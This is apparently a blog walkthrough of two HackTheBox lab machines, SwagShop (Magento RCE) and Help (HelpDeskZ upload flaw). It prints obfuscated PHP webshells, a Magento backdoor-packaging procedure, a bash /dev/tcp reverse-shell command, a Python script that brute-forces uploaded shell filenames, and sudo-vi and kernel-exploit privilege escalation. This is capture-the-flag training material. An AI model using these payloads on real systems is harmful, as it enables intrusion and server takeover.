---
title: "HackTheBox - WriteUp 2"
date: 2019-05-13T22:20:40+08:00
description: "HackTheBox 练手"
featuredImage: "https://alicdn.kmahyyg.xyz/asset_files/aether/cat_tech.webp"
categories: ["tech"]
draft: false
displayInMenu: false
displayInList: true
dropCap: false
---

# SwagShop

## Reference

1. Check here for more details about linux command utils: https://gtfobins.github.io/
2. https://packetstormsecurity.com/files/133327
3. http://10.10.10.140/app/etc/local.xml
4. https://github.com/lavalamp-/LavaMagentoBD
5. https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
6. http://blog.checkpoint.com/2015/04/20/analyzing-magento-vulnerability/

## Step 1: NMAP

Opened Port: 80, 22.

Apache2 with Ubuntu 18.04, SSH Useless...

## Step 2: SearchSploit

> For OSCP Preparation: Use Searchsploit to search exploit-db.com and modify it to your case.
> Leave the metasploit alone.

```bash
$ searchsploit -m exploits/xml/webapps/37977.py
------------------------------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                             |  Path (/opt/searchsploit/)
------------------------------------------------------------------------------------------------------------------------------------------------
Magento eCommerce - Remote Code Execution                  | exploits/xml/webapps/37977.py
------------------------------------------------------------------------------------------------------------------------------------------------
```

Found the RCE, next modify it. Maybe the creator want to let us know more about what's behind, he even not wrote correct URL rewrite in Apache.

```python
target = "http://10.10.10.140/"
target_url = target + "/index.php" + "/admin/Cms_Wysiwyg/directive/index/"
```

Why do I modify this file?  Check the last reference. 

Run the script and go to the admin panel to do the next step.

> NOTE: IF YOU MET 503 ERROR, SOMEONE MUST MODIFY THE `index.php` IN A WRONG WAY! RESET THE BOX!
> So, please be patient if you are a free user. Or just buy a VIP like what I do.

## Step 3: Normal User

Execute the Python Script. Use "forme:forme" to login `/downloader` administration extension panel.

Then, modify the webshell:

```bash
$ git clone https://github.com/lavalamp-/LavaMagentoBD
```

Go to the `LavaMagentoBD/Backdoor Code/app/code/community/Lavalamp/Connector/controllers/IndexController.php`, Open `AntSword`.

Insert the corresponding call URL to the `AntSword` and then generate an one-line shell like this:

```php
<?php $RQUC=create_function(chr(01306-01242).chr(786-671).str_rot13('b').base64_decode('bQ==').str_rot13('r'),chr(0x202-0x19d).str_rot13('i').chr(0x1149a/0x2da).chr(063030/0362).chr(01374-01324).str_rot13('$').chr(0x30d-0x29a).base64_decode('bw==').str_rot13('z').chr(0401-0234).chr(0x3488/0x148).chr(53985/915));$RQUC(base64_decode('MTk4N'.'TE5O0'.'BldkF'.'sKCRf'.''.chr(0233163/01647).str_rot13('R').chr(306-249).chr(990-906).chr(51600/600).''.''.chr(0134760/01250).chr(0x211-0x19d).chr(037260/0354).chr(0x6b30/0x118).base64_decode('MA==').''.'ZnZnh'.'0dl0p'.'OzU5N'.'TU1Nz'.'s='.''));?>
```

Don't forget the password the software gives you. Then make a `md5sum` of this php file, and change the corresponding value in the `LavaMagentoBD/Backdoor Code/package.xml`. Next, According the project readme, repack it and upload to the downloader panel. Now you have the reverse shell. Use AntSword as you pleased.

## Step 3: Before privilege escalation

After you get the reverse shell as www-data, just `cat /etc/passwd` to get the user `haris`, and next, `cat /home/haris/user.txt`, you get the normal user token.

Carefully check the `ls -alh /home/haris`, found `.sudo_as_administrator_successful` (something like), you know that you need to escalate with `sudo`.

## Step 4: Get interactive shell and escalate

Check GTFOBINS and machine, found Python3 with bash.

Use the following commands to get the interactive shell:

```bash
$ export RHOST=<YOUR IP>
$ nc -lp 14445
$ bash -c 'bash -i &>/dev/tcp/$RHOST/14445 0<&1'
$ python -c 'import pty; pty.spawn("/bin/bash")'
```

## Step 5: Escalate

Get the spawned interactive shell and run `sudo -l`, found:

```bash
$ sudo -l
root (NOPASSWD:ALL):/usr/bin/vi /var/www/html/*
```

**USE THE ABSOLUTE PATH** to get the root shell without any password and do the f*cking things you want:

```bash
$ sudo /usr/bin/vi /var/www/html/test.sh
```

Then `:!cat /root/root.txt` get the root token. 

Finished!

# Help

## Step 1: NMAP

80 For HTTP; 22 For SSH, Useless; 3000 For HTTP, Node.js ExpressJS framework.

Then use Nikto: Found Apache default page on port 80, found HelpDeskZ on `/support` .

## Step 2: Exploit, get normal user

Vulnerable Software Source Code:  [Sourcegraph](https://sourcegraph.com/github.com/AlexisGoatache/HelpDeskZ@006662bb856e126a38f2bb76df44a2e4e3d37350/-/blob/controllers/submit_ticket_controller.php#L137)

Check the code, even the developer let the filename get obfuscated by "Filename + MD5(timestamp).php", it still could be found via bruteforce.

```php
<?php
// ScFVmDQa 
$YdyH=create_function(chr(11232/312).base64_decode('cw==').chr(01014-0635).chr(0256112/01462).str_rot13('r'),chr(354-253).chr(0x187-0x111).base64_decode('YQ==').chr(0x11e74/0x2a7).chr(026140/0434).chr(31644/879).chr(101775/885).str_rot13('b').chr(0x355-0x2e8).str_rot13('r').chr(738-697).chr(073261/01003));$YdyH(base64_decode('MzMxM'.'jQyO0'.'BldkF'.'sKCRf'.''.base64_decode('VQ==').str_rot13('R').chr(711-654).str_rot13('G').chr(17286/201).''.''.chr(063750/0574).chr(01071-0705).chr(01674-01550).chr(0xbc15/0x21d).str_rot13('0').''.'ZWbUR'.'RYV0p'.'Ozk5M'.'zcyNj'.'s='.''));?>
```

Finish all the stuffs in the ticket and upload the one-line PHP trojan as attachment, **even if you get a notification that "File is not allowed", the file is successfully uploaded in fact.**

Use the python exploit here to enum the PHP trojan filename:

```python2
#!/usr/bin/env python2
# EID: 40300

import hashlib
import time
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) < 3:
    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]

currentTime = int(time.time())

for x in range(0, 1500):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl+md5hash+'.php'
    print "This is the " + str(x) + "time:"
    response = requests.head(url)
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)
    else:
        print "has tried " + url + ": " + str(response.status_code)

print "Sorry, I did not find anything"
```

Use the `http://10.10.10.121/support/uploads/tickets/ <PHP TROJAN FILENAME>` , please don't forget the last `/` of the app base URL.

After found it, just send a GET request to activate. Then do anything you want via `AntSword`.

## Step 3: Privilege Escalation

Execute `uname -a`, found `Linux Kernel 4.4.0-116`, GoogleFU~

Found a local privilege escalation exploit in `searchsploit "4.4.0-116"`, just mirrored it and send it to the box then compile it.

Get a reverse shell, then use `bash` to get the interactive shell, and use `python3` to spawn a tty.

Next, compile and execute: `gcc -o exsc 44298.c && ./exsc`, and then it will gives you a rooted spawned interactive reverse shell.

Finished.

(END) 2019.5.14
